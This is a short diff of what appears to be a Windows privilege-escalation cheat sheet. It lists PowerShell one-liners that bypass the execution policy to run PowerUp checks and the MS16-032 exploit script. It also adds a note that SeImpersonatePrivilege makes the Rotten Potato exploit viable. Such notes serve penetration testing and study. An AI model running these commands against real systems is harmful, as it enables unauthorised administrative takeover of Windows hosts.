@@ -131,6 +131,7 @@ wmic neteventlog get name
 
 automated tools
          powershell -exec bypass -command "& { Import-Module .\PowerUp.ps1; Invoke-AllChecks; }" 
+	 	Privilege   : SeImpersonatePrivilege      --> Rotten potato will work
          powershell -exec bypass -command "& { Import-Module .\39719.ps1; Invoke-MS16-032; }" 
 
                          
